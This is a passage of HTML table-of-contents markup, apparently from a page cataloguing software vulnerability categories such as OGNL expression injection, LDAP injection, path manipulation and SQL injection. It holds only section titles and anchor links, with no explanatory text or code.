href="#REFERENCES-276"><span class="toc-number">1.6.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Expression-Language-Injection-Spring"><span class="toc-number">1.6.28.</span> <span class="toc-text">Expression Language Injection: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-278"><span class="toc-number">1.6.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-279"><span class="toc-number">1.6.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-278"><span class="toc-number">1.6.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-277"><span class="toc-number">1.6.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Permission-Manipulation"><span class="toc-number">1.6.29.</span> <span class="toc-text">File Permission Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-279"><span class="toc-number">1.6.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-280"><span class="toc-number">1.6.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-279"><span class="toc-number">1.6.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-278"><span class="toc-number">1.6.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Formula-Injection"><span class="toc-number">1.6.30.</span> <span class="toc-text">Formula Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-280"><span class="toc-number">1.6.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-281"><span class="toc-number">1.6.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-280"><span class="toc-number">1.6.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-279"><span class="toc-number">1.6.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-Parameter-Pollution"><span class="toc-number">1.6.31.</span> <span class="toc-text">HTTP Parameter Pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-281"><span class="toc-number">1.6.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-282"><span class="toc-number">1.6.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-281"><span class="toc-number">1.6.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-280"><span class="toc-number">1.6.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hadoop-Cluster-Manipulation"><span class="toc-number">1.6.32.</span> <span class="toc-text">Hadoop Cluster Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-282"><span class="toc-number">1.6.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-283"><span class="toc-number">1.6.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-282"><span class="toc-number">1.6.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-281"><span class="toc-number">1.6.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hadoop-Job-Manipulation"><span class="toc-number">1.6.33.</span> <span class="toc-text">Hadoop Job Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-283"><span class="toc-number">1.6.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-284"><span class="toc-number">1.6.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-283"><span class="toc-number">1.6.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-282"><span class="toc-number">1.6.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation"><span class="toc-number">1.6.34.</span> <span class="toc-text">Header Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-284"><span class="toc-number">1.6.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-285"><span class="toc-number">1.6.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-284"><span class="toc-number">1.6.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-283"><span class="toc-number">1.6.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-Cookies"><span class="toc-number">1.6.35.</span> <span class="toc-text">Header Manipulation: Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-285"><span class="toc-number">1.6.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-286"><span class="toc-number">1.6.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-285"><span class="toc-number">1.6.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-284"><span class="toc-number">1.6.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-SMTP"><span class="toc-number">1.6.36.</span> <span class="toc-text">Header Manipulation: SMTP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-286"><span class="toc-number">1.6.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-287"><span class="toc-number">1.6.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-286"><span class="toc-number">1.6.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-285"><span class="toc-number">1.6.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Sanitizer-Policy"><span class="toc-number">1.6.37.</span> <span class="toc-text">Insecure Sanitizer Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-287"><span class="toc-number">1.6.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-288"><span class="toc-number">1.6.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-287"><span class="toc-number">1.6.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-286"><span class="toc-number">1.6.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Intent-Manipulation"><span class="toc-number">1.6.38.</span> <span class="toc-text">Intent Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-288"><span class="toc-number">1.6.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-289"><span class="toc-number">1.6.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-288"><span class="toc-number">1.6.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-287"><span class="toc-number">1.6.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-Injection"><span class="toc-number">1.6.39.</span> <span class="toc-text">JSON Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-289"><span class="toc-number">1.6.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-290"><span class="toc-number">1.6.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-289"><span class="toc-number">1.6.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-288"><span class="toc-number">1.6.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Entry-Poisoning"><span class="toc-number">1.6.40.</span> <span class="toc-text">LDAP Entry Poisoning</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-290"><span class="toc-number">1.6.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-291"><span class="toc-number">1.6.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-290"><span class="toc-number">1.6.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-289"><span class="toc-number">1.6.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Injection"><span class="toc-number">1.6.41.</span> <span class="toc-text">LDAP Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-291"><span class="toc-number">1.6.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-292"><span class="toc-number">1.6.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-291"><span class="toc-number">1.6.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-290"><span class="toc-number">1.6.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Manipulation"><span class="toc-number">1.6.42.</span> <span class="toc-text">LDAP Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-292"><span class="toc-number">1.6.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-293"><span class="toc-number">1.6.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-292"><span class="toc-number">1.6.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-291"><span class="toc-number">1.6.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging"><span class="toc-number">1.6.43.</span> <span class="toc-text">Log Forging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-293"><span class="toc-number">1.6.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-294"><span class="toc-number">1.6.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-293"><span class="toc-number">1.6.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-292"><span class="toc-number">1.6.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging-debug"><span class="toc-number">1.6.44.</span> <span class="toc-text">Log Forging (debug)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-294"><span class="toc-number">1.6.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-295"><span class="toc-number">1.6.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-294"><span class="toc-number">1.6.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-293"><span class="toc-number">1.6.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-IMAP"><span class="toc-number">1.6.45.</span> <span class="toc-text">Mail Command Injection: IMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-295"><span class="toc-number">1.6.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-296"><span class="toc-number">1.6.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-295"><span class="toc-number">1.6.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-294"><span class="toc-number">1.6.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-POP3"><span class="toc-number">1.6.46.</span> <span class="toc-text">Mail Command Injection: POP3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-296"><span class="toc-number">1.6.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-297"><span class="toc-number">1.6.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-296"><span class="toc-number">1.6.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-295"><span class="toc-number">1.6.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-SMTP"><span class="toc-number">1.6.47.</span> <span class="toc-text">Mail Command Injection: SMTP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-297"><span class="toc-number">1.6.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-298"><span class="toc-number">1.6.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-297"><span class="toc-number">1.6.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-296"><span class="toc-number">1.6.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-XML-Validation"><span class="toc-number">1.6.48.</span> <span class="toc-text">Missing XML Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-298"><span class="toc-number">1.6.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-299"><span class="toc-number">1.6.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-298"><span class="toc-number">1.6.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-297"><span class="toc-number">1.6.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-XML-Validation-Untyped-Response"><span class="toc-number">1.6.49.</span> <span class="toc-text">Missing XML Validation: Untyped Response</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-299"><span class="toc-number">1.6.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-300"><span class="toc-number">1.6.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-299"><span class="toc-number">1.6.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-298"><span class="toc-number">1.6.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection"><span class="toc-number">1.6.50.</span> <span class="toc-text">OGNL Expression Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-300"><span class="toc-number">1.6.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-301"><span class="toc-number">1.6.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-300"><span class="toc-number">1.6.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-299"><span class="toc-number">1.6.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Double-Evaluation"><span class="toc-number">1.6.51.</span> <span class="toc-text">OGNL Expression Injection: Double Evaluation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-301"><span class="toc-number">1.6.51.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-302"><span class="toc-number">1.6.51.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-301"><span class="toc-number">1.6.51.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-300"><span class="toc-number">1.6.51.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Dynamic-Method-Invocation"><span class="toc-number">1.6.52.</span> <span class="toc-text">OGNL Expression Injection: Dynamic Method Invocation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-302"><span class="toc-number">1.6.52.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-303"><span class="toc-number">1.6.52.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-302"><span class="toc-number">1.6.52.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-301"><span class="toc-number">1.6.52.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection-Struts-2"><span class="toc-number">1.6.53.</span> <span class="toc-text">OGNL Expression Injection: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-303"><span class="toc-number">1.6.53.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-304"><span class="toc-number">1.6.53.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-303"><span class="toc-number">1.6.53.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-302"><span class="toc-number">1.6.53.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Open-Redirect"><span class="toc-number">1.6.54.</span> <span class="toc-text">Open Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-304"><span class="toc-number">1.6.54.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-305"><span class="toc-number">1.6.54.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-304"><span class="toc-number">1.6.54.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-303"><span class="toc-number">1.6.54.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation"><span class="toc-number">1.6.55.</span> <span class="toc-text">Path Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-305"><span class="toc-number">1.6.55.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-306"><span class="toc-number">1.6.55.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-305"><span class="toc-number">1.6.55.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-304"><span class="toc-number">1.6.55.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation-Zip-Entry-Overwrite"><span class="toc-number">1.6.56.</span> <span class="toc-text">Path Manipulation: Zip Entry Overwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-306"><span class="toc-number">1.6.56.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-307"><span class="toc-number">1.6.56.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-306"><span class="toc-number">1.6.56.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-305"><span class="toc-number">1.6.56.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control"><span class="toc-number">1.6.57.</span> <span class="toc-text">Process Control</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-307"><span class="toc-number">1.6.57.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-308"><span class="toc-number">1.6.57.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-307"><span class="toc-number">1.6.57.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-306"><span class="toc-number">1.6.57.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control-Invoker-Servlet"><span class="toc-number">1.6.58.</span> <span class="toc-text">Process Control: Invoker Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-308"><span class="toc-number">1.6.58.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-309"><span class="toc-number">1.6.58.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-308"><span class="toc-number">1.6.58.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-307"><span class="toc-number">1.6.58.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Query-String-Injection-Amazon-Web-Services"><span class="toc-number">1.6.59.</span> <span class="toc-text">Query String Injection: Amazon Web Services</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-309"><span class="toc-number">1.6.59.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-310"><span class="toc-number">1.6.59.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-309"><span class="toc-number">1.6.59.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Query-String-Injection-Android-Provider"><span class="toc-number">1.6.60.</span> <span class="toc-text">Query String Injection: Android Provider</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-310"><span class="toc-number">1.6.60.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-311"><span class="toc-number">1.6.60.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-310"><span class="toc-number">1.6.60.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-308"><span class="toc-number">1.6.60.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected-File-Download"><span class="toc-number">1.6.61.</span> <span class="toc-text">Reflected File Download</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-311"><span class="toc-number">1.6.61.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-312"><span class="toc-number">1.6.61.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-309"><span class="toc-number">1.6.61.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resource-Injection"><span class="toc-number">1.6.62.</span> <span class="toc-text">Resource Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-312"><span class="toc-number">1.6.62.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-313"><span class="toc-number">1.6.62.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-311"><span class="toc-number">1.6.62.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-310"><span class="toc-number">1.6.62.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">1.6.63.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-313"><span class="toc-number">1.6.63.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-314"><span class="toc-number">1.6.63.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-312"><span class="toc-number">1.6.63.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-311"><span class="toc-number">1.6.63.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item 